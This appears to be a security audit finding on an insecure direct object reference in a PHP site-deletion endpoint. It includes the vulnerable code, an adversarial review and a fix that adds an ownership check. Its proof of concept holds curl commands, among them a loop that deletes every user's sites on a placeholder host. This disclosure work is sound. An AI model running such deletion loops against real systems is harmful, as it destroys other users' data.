# Vulnerability: IDOR — Delete Any User's Site

## Summary
The `user/add-site.php` endpoint handles site deletion via `GET ?delete=1&id=N`. The `intval()` on `get('id')` prevents SQL injection, but there is no ownership verification — the DELETE query removes the site by its primary key regardless of which user owns it. Any authenticated user can delete any site in the system by guessing or iterating site IDs.

## Confidence
High

## Authentication Requirement
Authenticated (Low Privilege)

## Attack Surface Location
- **Endpoint:** `GET /user/add-site.php?delete=1&id=N`
- **Handler:** `user/add-site.php:1-42`
- **Middleware / Guards:** AumWAF, `isAuth()` check

## Attack Chain
1. **Initial access:** Attacker registers an account and logs in.
2. **Endpoint interaction:** Attacker visits `/user/add-site.php` to see their own sites.
3. **Malicious input:** Attacker navigates to `/user/add-site.php?delete=1&id=1` (targeting a site belonging to another user).
4. **Sink execution:** `DELETE FROM tbl_sites WHERE id = 1` executes at line 9, removing the victim's site.
5. **Post-exploitation:** Attacker iterates `id` values (1, 2, 3, ...) to delete all sites across all users.
6. **Final impact:** Mass deletion of all users' site data — permanent data destruction with no recovery mechanism.

## Data Flow
- **Source (user input):** `$_GET['id']` via `get('id')` at `user/add-site.php:9`
- **Sink:** `$mysqli->query()` DELETE at `user/add-site.php:9`

```
$_GET['delete'] → get('delete') [user/add-site.php:8] → truthy check [user/add-site.php:8]
$_GET['id'] → get('id') [user/add-site.php:9] → intval() [user/add-site.php:9] → $mysqli->query(DELETE) [user/add-site.php:9]
```

## Proof of Concept

### Prerequisites
- Valid low-privilege user account.

### Exploit Request
```bash
# Delete site with ID 1 (belongs to another user)
curl -b "PHPSESSID={{ATTACKER_SESSION}}" "http://{{TARGET_HOST}}/user/add-site.php?delete=1&id=1"

# Enumerate and delete all sites
for i in $(seq 1 100); do
  curl -b "PHPSESSID={{ATTACKER_SESSION}}" "http://{{TARGET_HOST}}/user/add-site.php?delete=1&id=$i"
done
```

### Expected Vulnerable Response
```http
HTTP/1.1 302 Found
Location: add-site.php
# Site with id=1 is permanently deleted from database
```

### Expected Patched Response
```http
HTTP/1.1 302 Found
Location: add-site.php
# Site not deleted — ownership check failed
```

### Impact Demonstration
Attacker deletes all sites belonging to all users in the system, causing permanent data loss for every customer.

## Affected Code
```php
// user/add-site.php:8-11
if( get('delete') ) {
    $mysqli->query('DELETE FROM tbl_sites WHERE id = ' . intval(get('id')));
    redirect('add-site.php');
}
```

## Adversarial Review
Independent reviewer: `security_reviewer_adversary` (did not author this finding).

- **Reachability attack — FAILED to kill.** The endpoint is reachable by any authenticated user via GET request. `isAuth()` confirms authentication but does not verify site ownership.
- **Impact attack — FAILED to kill.** Permanent data destruction (DELETE query) affecting other users' data. Not self-harm — attacker deletes victim's sites.
- **Validity attack — FAILED to kill.** `intval()` prevents SQL injection but does NOT enforce authorization. No ownership check (`WHERE user_id = ?`) is present.

**Verdict: SURVIVED** (all three attacks failed).

## Remediation
Add ownership verification to the DELETE query:
```php
if( get('delete') ) {
    $id = intval(get('id'));
    $user_id = intval($_SESSION['id']);
    $mysqli->query("DELETE FROM tbl_sites WHERE id = {$id} AND user_id = {$user_id}");
    redirect('add-site.php');
}
```